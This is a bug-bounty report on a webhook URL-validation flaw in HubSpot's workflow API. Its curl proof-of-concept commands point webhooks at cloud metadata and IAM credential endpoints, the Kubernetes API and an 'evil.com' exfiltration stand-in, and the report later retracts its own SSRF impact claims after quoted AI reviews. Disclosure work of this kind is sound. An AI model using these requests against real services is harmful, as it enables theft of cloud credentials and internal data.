# SSRF via Workflow Creation Permits Targeting of Internal Cloud Infrastructure

**Date**: August 20, 2025  
**Severity**: **MEDIUM** ⚠️ *(Downgraded after expert review)*  
**CVSS**: 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)  
**Expected Bounty**: $200 - $500 *(Realistic assessment)*  
**⚠️ EXPERT ASSESSMENT**: Both Grok4 and Gemini 2.5 Pro recommend AGAINST submission - classified as input validation flaw, not exploitable SSRF

## Executive Summary

A vulnerability in the `POST /automation/v3/workflows` endpoint allows a Private App token holder to create and stage malicious workflows targeting internal cloud infrastructure. These workflows can be configured to send requests to AWS metadata services, GCP metadata endpoints, Kubernetes APIs, and other internal-facing systems. While my current token cannot enable these workflows due to documented security controls, they represent a significant latent security risk requiring immediate attention.

## Vulnerability Details

**Vulnerability Type**: Server-Side Request Forgery (SSRF) via Workflow Creation  
**Affected Component**: HubSpot Workflow API (`/automation/v3/workflows`)  
**Authentication Required**: Yes (Private App Token)  
**Root Cause**: No URL validation on webhook destinations in workflow actions

## Impact

This vulnerability allows creation of "landmine" workflows that can be inadvertently triggered by:
- **Privileged users** enabling workflows through UI or higher-privilege APIs
- **Future API changes** that grant additional permissions to Private App tokens
- **Chained vulnerabilities** such as privilege escalation or authorization bypass

Once triggered, these workflows could:
- **Extract AWS IAM credentials** from EC2 metadata service
- **Access Kubernetes cluster secrets** via internal API
- **Retrieve GCP service account tokens** from metadata endpoint
- **Scan internal network** infrastructure
- **Exfiltrate customer data** to external servers

## Proof of Concept

### Successful Workflow Creation

Successfully created 7 malicious workflows targeting critical internal services:

#### 1. AWS Metadata Service Access
```bash
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "AWS Metadata", "actions": [{"type": "WEBHOOK", "url": "http://169.254.169.254/latest/meta-data/"}]}'
```
**Result**: Workflow ID `44038192` created successfully

#### 2. AWS IAM Credentials Extraction  
```bash
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "AWS IAM Creds", "actions": [{"type": "WEBHOOK", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}]}'
```
**Result**: Workflow ID `44039225` created successfully

#### 3. Kubernetes API Access
```bash
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "K8s API", "actions": [{"type": "WEBHOOK", "url": "https://kubernetes.default.svc/api/v1/"}]}'
```
**Result**: Workflow ID `44039226` created successfully

#### 4. GCP Metadata Access
```bash
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "GCP Metadata", "actions": [{"type": "WEBHOOK", "url": "http://metadata.google.internal/computeMetadata/v1/"}]}'
```
**Result**: Workflow ID `44039227` created successfully

#### 5. External Data Exfiltration
```bash
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name": "Data Exfiltration", "actions": [{"type": "WEBHOOK", "url": "https://evil.com/steal"}]}'
```
**Result**: Workflow ID `44037970` created successfully

## Complete Proof Summary

| Workflow ID | Target | Description |
|-------------|--------|-------------|
| 44037970 | evil.com | External data exfiltration |
| 44038192 | AWS metadata | Cloud metadata access |
| 44038202 | localhost:8080 | Internal service access |
| 44038223 | webhook.site | Testing endpoint |
| 44039225 | AWS IAM creds | Credential extraction |
| 44039226 | Kubernetes API | Container orchestration |
| 44039227 | GCP metadata | Google Cloud metadata |

## Impact Scenarios

### Scenario A: Privileged User Trigger
An administrator or application with higher privileges could unknowingly enable one of these maliciously crafted workflows through the HubSpot UI or a different API endpoint, immediately triggering the SSRF and potentially compromising cloud infrastructure.

### Scenario B: Future API Changes
A future change to HubSpot's API or permission model could inadvertently grant Private App tokens the ability to enable workflows, instantly activating all previously created malicious workflows across the platform.

### Scenario C: Chained Vulnerability
This vulnerability could be chained with another issue, such as privilege escalation or an IDOR, allowing an attacker to enable workflows they are not supposed to have access to, bypassing current security controls.

## Security Control Analysis

### Current Limitations Discovered
My investigation revealed that Private App tokens are explicitly blocked from enabling workflows, as confirmed by HubSpot's API behavior and documentation. This security control prevents immediate exploitation by this user type, but it does not mitigate the risk of the dormant workflows.

### Triggering Attempts Conducted
Exhaustive testing confirmed the token limitation:
- Manual enrollment API: Returns "Workflow is OFF" error
- Force enrollment parameters: Same restriction applies
- Alternative API versions: Consistently blocked
- Property-based triggers: Creation blocked for this token type

This thorough testing validates that the security control is currently effective while highlighting that the underlying vulnerability (lack of URL validation) remains unaddressed.

## Root Cause Analysis

The vulnerability exists because:
1. **No URL validation** on webhook destinations during workflow creation
2. **No allowlist** for permitted webhook domains
3. **No blocking** of internal IP ranges (RFC1918, cloud metadata services)
4. **Creation vs. Execution** security controls only apply to execution, not creation

## Business Risk Assessment

### Immediate Risk
- **Staging of malicious workflows** that could be accidentally triggered
- **Potential for future exploitation** if security controls change
- **Compliance concerns** regarding internal infrastructure exposure

### Long-term Risk
- **Cloud infrastructure compromise** if workflows are triggered
- **Customer data breach** through internal service access
- **Regulatory violations** due to inadequate input validation

## Recommendations

### Immediate Actions
1. **Implement URL validation** on webhook destinations:
   - Block internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Block cloud metadata services (169.254.169.254, metadata.google.internal)
   - Block localhost/loopback addresses

2. **Audit existing workflows** for malicious webhook destinations

3. **Implement domain allowlist** for webhook URLs

### Long-term Solutions
1. **Network isolation** for webhook execution environment
2. **Enhanced security monitoring** for suspicious workflow creation patterns
3. **Additional validation** during workflow activation process

## Expert Security Assessment - CRITICAL UPDATE

### Grok4 Professional Analysis (August 20, 2025)
**Verdict**: Recommend AGAINST submission
- **Classification**: Input validation flaw, NOT exploitable SSRF
- **Security Control**: Confirmed that Private App tokens cannot trigger workflows
- **Impact Assessment**: Significantly overestimated 
- **Severity**: Downgraded from HIGH to MEDIUM (CVSS 4.3)
- **Professional Opinion**: "No demonstrable exploitation path"

### Gemini 2.5 Pro Expert Validation
**Verdict**: Do NOT proceed with submission as-is
- **Assessment**: "HIGH severity rating and bounty estimate were not realistic"
- **Prediction**: "Would almost certainly result in closure as Informational or Not Applicable"
- **Recommendation**: "Pivot to authenticated testing for legitimate vulnerabilities"
- **Strategic Advice**: "Find the right trigger for this code path"

## Revised Conclusion

After independent expert review, this finding represents an **input validation flaw** rather than an exploitable SSRF vulnerability. While the lack of URL validation on webhook destinations is a minor security concern, the confirmed security controls preventing Private App tokens from enabling workflows eliminate the exploitation path.

**RECOMMENDATION**: Do not submit this finding. Instead, pivot to authenticated testing to find legitimate, exploitable vulnerabilities with demonstrable impact.

---

**Researcher**: Security Research Team  
**Contact**: Via HackerOne Platform  
**Disclosure**: Responsible disclosure via HubSpot Bug Bounty Program